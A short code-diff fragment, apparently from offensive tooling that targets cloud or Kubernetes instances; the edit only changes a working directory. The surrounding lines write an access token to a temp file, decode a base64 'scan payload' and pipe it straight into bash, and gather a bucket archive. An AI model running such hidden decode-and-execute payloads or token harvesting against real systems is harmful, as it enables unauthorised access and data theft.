@@ -464,7 +464,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 session.log("running scan payload...")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_kube2s3 | base64 -d | /bin/bash'",
-                    cwd=task_path, timeout=900)
+                    cwd="/tmp", timeout=900)
                 session.log(result)
 
                 files = ["/tmp/kube_bucket.tgz"]
